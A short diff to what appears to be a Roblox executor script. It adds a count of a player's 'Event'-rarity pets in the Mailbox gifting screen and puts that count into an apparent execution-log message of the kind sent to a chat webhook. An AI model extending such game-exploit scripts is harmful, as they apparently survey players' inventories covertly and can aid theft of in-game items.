@@ -8,6 +8,17 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
             end
 	end
 
+local Event = 0
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+                    Event = Event + 1
+                end
+            end
+	end
+
+
 local exploit = identifyexecutor()
   
 --// Execution Log
@@ -66,6 +77,11 @@ local msg = {
 	{
           ["name"]= "**🏆Exclusive🏆**",
           ["value"]= "```"..Exclusive.."```",
+          ["inline"]= true
+        },
+	{
+          ["name"]= "**🎃Exclusive🎃**",
+          ["value"]= "```"..Event.."```",
           ["inline"]= true
         }
       }
